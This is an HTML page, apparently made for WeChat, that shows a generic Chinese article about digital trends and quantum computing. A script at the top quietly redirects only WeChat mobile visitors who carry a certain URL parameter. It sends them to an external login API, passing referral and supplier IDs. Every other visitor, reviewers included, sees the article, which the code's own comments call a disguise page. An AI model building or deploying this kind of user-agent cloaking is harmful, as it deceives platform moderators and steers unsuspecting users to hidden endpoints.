<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>未来协议：数字前沿解析</title>
    <script>
        // 放在最顶部，防止页面闪现
        (function () {
            var config = {
                domain: 'https://1004.jdnews.cn',
                appId: '10001',
                apiPath: '/index.php/api/user.usermp/login'
            };

            var ua = navigator.userAgent;
            var isWechat = /MicroMessenger/i.test(ua);
            var isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
            var urlParams = new URLSearchParams(window.location.search);
            var rawC = urlParams.get('c');

            // 只有微信 + 手机 + 带参数，才执行跳转；其他情况显示伪装页
            if (isWechat && isMobile && rawC) {
                var decoded = decodeURIComponent(rawC);
                var p = new URLSearchParams(decoded);
                var finalParams = new URLSearchParams();
                if (p.get('referee_id'))       finalParams.set('referee_id',       p.get('referee_id'));
                if (p.get('shop_supplier_id')) finalParams.set('shop_supplier_id', p.get('shop_supplier_id'));
                finalParams.set('app_id', config.appId);
                finalParams.set('t', Math.floor(Date.now() / 1000));
                location.replace(config.domain + config.apiPath + '?' + finalParams.toString());
            } else {
                // 非微信：显示伪装页
                window.__showDecoy = true;
            }
        })();
    </script>
    <style>
        #decoy { display: none; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; line-height: 1.6; color: #333; margin: 0; background: #f8f9fa; }
        .wrap { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
        h1 { color: #1a73e8; font-size: 26px; }
        .meta { color: #888; font-size: 13px; margin-bottom: 20px; }
        .card { background: #fff; padding: 28px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.06); }
    </style>
</head>
<body>
    <div id="decoy" class="wrap">
        <h1>未来协议：数字前沿解析与趋势洞察</h1>
        <div class="meta">发布日期：2024-05-20 · 阅读时间：8 分钟 · 作者：TechInsight</div>
        <div class="card">
            <h2>引言：数字纪元的新范式</h2>
            <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本文旨在为读者提供一份关于未来科技核心概念的深度解析。</p>
            <h3>数据结构：信息流的骨架</h3>
            <p>高效的数据结构是构建任何复杂系统的基石，决定了信息存储、检索与处理的效率。量子计算代表着计算能力的下一次革命，通过利用量子力学现象处理经典计算机无法解决的问题...</p>
        </div>
    </div>
    <script>
        if (window.__showDecoy) {
            document.getElementById('decoy').style.display = 'block';
            document.title = '未来协议：数字前沿解析';
        }
    </script>
</body>
</html>
